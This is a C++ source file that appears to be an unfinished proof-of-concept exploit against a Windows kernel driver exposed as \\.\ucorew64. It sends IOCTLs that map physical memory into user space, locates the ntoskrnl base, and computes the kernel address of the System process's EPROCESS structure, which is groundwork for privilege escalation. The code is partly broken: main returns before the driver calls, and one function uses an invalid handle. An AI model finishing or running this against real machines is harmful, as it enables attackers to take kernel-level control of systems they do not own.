#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>


#define IOCTL_MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define IOCTL_UnmapPhysicalMemory 0xFA002EEC
#define STATUS_SUCCESS 0x0

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0x0B


typedef struct struct_buffer
{
	void* SectionHandle;
	DWORD offset;
	unsigned int BusAddress;
	PVOID PhysicalBaseAddress;
} struct_buffer;

typedef struct Phys32Struct
{
	HANDLE PhysicalMemoryHandle;
	SIZE_T dwPhysMemSizeInBytes;
	PVOID pvPhysAddress;
	PVOID pvPhysMemLin;
} Phys32Struct;
//source: https://github.com/ellysh/InpOut32/blob/fa28b483c4ab9e18f6d437fad390022181aa37f9/driver/hwinterfacedrv.h#L15

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
//source: https://processhacker.sourceforge.io/doc/ntldr_8h_source.html


LPVOID EPROCESS_address(LPVOID ntoskernlBase) {
	HMODULE hNtoskrl = LoadLibrary(L"ntoskrnl.exe");
	if (hNtoskrl == NULL) {
		fprintf(stderr, "LoadLibrary failed.\n");
		return NULL;
	}

	LPVOID PsInitialSystemProcess = (LPVOID)GetProcAddress(hNtoskrl, "PsInitialSystemProcess");
	if (hNtoskrl == NULL) {
		fprintf(stderr, "GetProcAddress failed.\n");
		return NULL;
	}
	__int64 EPROCESS_address = (__int64)PsInitialSystemProcess - (__int64)hNtoskrl + (__int64)ntoskernlBase;
	return (LPVOID)EPROCESS_address;
}

LPVOID ntoskernl_base(void) {
	PVOID nt_base = NULL;
	ULONG systemInformationLength = 1024 * 1024;

	PRTL_PROCESS_MODULES processModules = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, systemInformationLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (processModules == NULL) {
		fprintf(stderr, "VirtualAlloc failed.\n");
		return NULL;
	}

	PULONG returnLength = 0;
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, processModules, systemInformationLength, returnLength);
	if (!NT_SUCCESS(status)) {
		fprintf(stderr, "NtQuerySystemInformation failed: %ld\n", status);
		VirtualFree(processModules, 0, MEM_RELEASE);
		return NULL;
	}

	for (int i = 0; i < processModules->NumberOfModules; i++)
	{

		const char* imageName = (const char*)processModules->Modules[i].FullPathName + processModules->Modules[i].OffsetToFileName;
		if (strcmp("ntoskrnl.exe", imageName) == 0) {
			nt_base = processModules->Modules[i].ImageBase;

			printf("\n*****************************************************");
			printf("\nImage base: %#p", processModules->Modules[i].ImageBase);
			printf("\nImage name: %s", processModules->Modules[i].FullPathName + processModules->Modules[i].OffsetToFileName);
			printf("\nImage full path: %s", processModules->Modules[i].FullPathName);
			printf("\nImage size: %d", processModules->Modules[i].ImageSize);
			printf("\n*****************************************************\n");
		}
	}


	return nt_base;
}

NTSTATUS UnmapPhysicalMemory(Phys32Struct& phys32) {
	HANDLE device2 = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned2 = 0;


	printf("[ ] Calling UnmapPhysicalMemory 0x%p\n", UnmapPhysicalMemory);
	status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, &phys32,
		sizeof(phys32), NULL, 0, &bytesReturned2, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] UnmapPhysicalMemory failed with %X\n", status);
		return EXIT_FAILURE;
		//https://github.com/ellysh/InpOut32/blob/master/driver/hwinterfacedrv.c
	}
	printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", IOCTL_UnmapPhysicalMemory);
	printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", bytesReturned2, bytesReturned2);

	return status;
}

int main(char argc, char** argv)
{
	printf("\n\n\nEPROCESS_adress: %p", EPROCESS_address(ntoskernl_base()));

	return 0;
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;
	Phys32Struct phys32Struct = { 0 };


	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
		return FALSE;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &phys32Struct, sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		return EXIT_FAILURE;
	}
	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[*] Buffer from the kernel land:\n");
	printf("phys32Struct.dwPhysMemSizeInBytes: %lld\n", phys32Struct.dwPhysMemSizeInBytes);
	printf("phys32Struct.PhysicalMemoryHandle: %p\n", phys32Struct.PhysicalMemoryHandle);
	printf("phys32Struct.pvPhysAddress: %p\n", phys32Struct.pvPhysAddress);
	printf("phys32Struct.pvPhysMemLin: %p\n", phys32Struct.pvPhysMemLin);


	system("pause");

	CloseHandle(phys32Struct.PhysicalMemoryHandle);
	CloseHandle(device);
	return EXIT_SUCCESS;
}